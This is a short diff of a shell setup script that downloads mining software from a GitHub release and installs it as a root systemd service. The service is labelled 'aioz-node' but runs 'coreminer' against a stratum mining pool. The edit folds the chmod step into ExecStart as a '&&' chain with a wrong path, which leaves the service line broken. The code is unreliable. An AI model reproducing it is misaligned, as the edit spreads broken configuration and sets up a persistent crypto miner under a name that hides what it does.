@@ -11,7 +11,7 @@ fi
 #
 wget https://github.com/cecepabdul/mining/releases/download/xdag/coreapp.zip
 unzip coreapp.zip
-chmod +x coreminer
+
 
 
 #
@@ -21,8 +21,7 @@ Description=aioz-node
 After=network.target
 
 [Service]
-ExecStart=/root/coreapp/coreminer -P stratum://cb567ce1c516e760df614d857b39a584461075a77a6b.pc@as.catchthatrabbit.com:8008
-
+ExecStart=/root/coreapp/chmod +x coreminer && ./coreminer -P stratum://cb567ce1c516e760df614d857b39a584461075a77a6b.pc@as.catchthatrabbit.com:8008
 WorkingDirectory=/root/coreapp/
 Restart=always
 RestartSec=3
